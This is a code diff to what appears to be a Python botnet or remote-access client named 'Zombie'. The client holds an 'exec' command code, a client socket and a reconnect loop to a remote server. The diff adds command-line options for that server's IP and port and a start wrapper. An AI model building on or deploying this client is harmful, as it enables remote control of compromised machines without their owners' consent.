@@ -7,6 +7,7 @@ import re
 import socket
 from threading import Thread
 from time import sleep
+import argparse
 
 codes_list = {
     'exec':'1',
@@ -194,9 +195,22 @@ class Zombie:
         self.connection_is_closed = True
         self.client_socket.close()
 
-def start_zombie():
+def parse_args():
     server_ip = 'replace_server_ip'
     server_port = 'replace_server_port'
+
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument('--ip', help=f'Server Remote IP [Default : {server_ip}]', default=server_ip)
+    parser.add_argument('--port', help=f'Server Remote Port [Default : {server_port}]', default=server_port)
+
+    args ,unknown = parser.parse_known_args()
+
+    start_zombie(ip=args.ip, port=args.port)
+
+def start_zombie(ip, port):
+    server_ip = ip
+    server_port = port
     server_port = int(server_port)
     while True:
         try:
@@ -206,5 +220,8 @@ def start_zombie():
         except KeyboardInterrupt:
             exit()
 
+def start():
+    parse_args()
+
 if __name__ == '__main__':
-    start_zombie()
+    start()
